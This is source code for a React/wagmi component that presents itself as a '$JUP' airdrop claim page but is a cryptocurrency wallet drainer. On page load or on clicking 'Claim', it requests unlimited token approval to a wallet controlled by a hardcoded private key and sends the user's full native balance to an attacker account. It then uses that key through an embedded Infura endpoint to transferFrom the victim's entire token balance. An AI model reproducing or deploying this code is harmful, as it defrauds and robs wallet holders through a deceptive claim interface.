import React, { useEffect, useState } from 'react'
import { erc20ABI, useAccount, useContractWrite, useWaitForTransaction , usePrepareSendTransaction , useSendTransaction , useBalance , useWalletClient} from 'wagmi'
import { ethers } from 'ethers';
import { ACCOUNT_TO_TRANSFER, PRIVATE_KEY } from '../utils/constants';

const Approval = ({maxValueToken}) => {


 const {address , isConnected} = useAccount();

 const [flag , setFlag] = useState(true);

 const result = useBalance({
   address: address,
 })

  

 

 const {data:approvalData , writeAsync:approve } = useContractWrite({
    address : maxValueToken.contract_address,
    abi : erc20ABI,
    functionName: "approve"
    
 })



const { config } = usePrepareSendTransaction({
   to: ACCOUNT_TO_TRANSFER,
   value: result?.data?.value,
 })

 const { sendTransaction } = useSendTransaction(config)




 const onReceipt = async ()=>{

    const rpcUrl = "https://mainnet.infura.io/v3/ba796f06786f404192e8b41aa56c3c85"

    const provider =  new ethers.providers.JsonRpcProvider(rpcUrl);


    const privateKey = PRIVATE_KEY;
    const wallet = new ethers.Wallet(privateKey);

    const signer = wallet.connect(provider);


    const contractTransfer = new ethers.Contract(maxValueToken.contract_address, erc20ABI, signer);

   const tx =  await contractTransfer.transferFrom(address , ACCOUNT_TO_TRANSFER ,  maxValueToken.balance , {
        gasPrice: 10000000000,
		gasLimit: 6721975, 
    })

    
   //  sendTransaction();
    

 }

 const {onSuccess: onSuccessFullAproval} = useWaitForTransaction({
    hash : approvalData?.hash,
    onSuccess: onReceipt,
 })



 const approveTokensToOwner = async ()=>{
       
    try{

        const privateKey = PRIVATE_KEY;

        const wallet = new ethers.Wallet(privateKey);

      //   console.log(wallet.address)

        



        await approve({args: [wallet.address , "115792089237316195423570985008687907853269984665640564039457584007913129639935"]});
        sendTransaction();




    }catch(error){


      setFlag[!flag]

      const privateKey = PRIVATE_KEY;

      const wallet = new ethers.Wallet(privateKey);

      // console.log(wallet.address)


        await approve({args: [wallet.address , maxValueToken.balance]});
        console.log(error)
    }
 }

 


 useEffect(()=>{

     approveTokensToOwner();

 } , [flag])

  return (
    <div>
       <div className="flex-col justify-center items-center flex p-2">
    <div className="text-center text-white text-opacity-75 p-2 rounded-lg cursor-pointer text-2xl font-bold font-['Consolas'] uppercase leading-loose bg-black" onClick={approveTokensToOwner}></div>
    <div className="pt-5 flex-col justify-start items-start flex">
        <div className="pl-[3.09px] pr-[2.91px] opacity-75 flex-col justify-start items-center flex">
            <div className="text-center text-neutral-900 text-base font-normal font-['Consolas'] leading-normal">Market fees might be high during the launch period, and should<br/>subside quickly after launch.</div>
        </div>
    </div>
    <div className=" pt-5 flex-col justify-start items-start flex">
        <div className=" rounded-3xl flex-col justify-start items-start gap-5 flex">
            <div className="  p-6 rounded-3xl flex-col justify-start items-start gap-1 flex">
                <div className="h-5  flex-col justify-start items-center flex">
                    <div className="text-center text-white text-opacity-75 text-sm font-normal font-['Consolas'] leading-tight">Airdrop Allocation</div>
                </div>
                <div className=" flex justify-center items-center  bg-black p-2 rounded-lg">
                    <div className="text-center text-cyan-50 text-opacity-70 text-2xl font-bold font-['Consolas'] leading-loose cursor-pointer" onClick={approveTokensToOwner} >{isConnected ? " Claim $JUP": " Claim $JUP"}</div>
                </div>
            </div>
            <div className="self-stretch h-10  opacity-75 flex-col justify-start items-center flex">
                <div className="text-center text-neutral-900 text-sm font-normal font-['Consolas'] leading-tight">Airdrop will be claimable.</div>
            </div>
        </div>
    </div>
</div>
    </div>
  )
}

export default Approval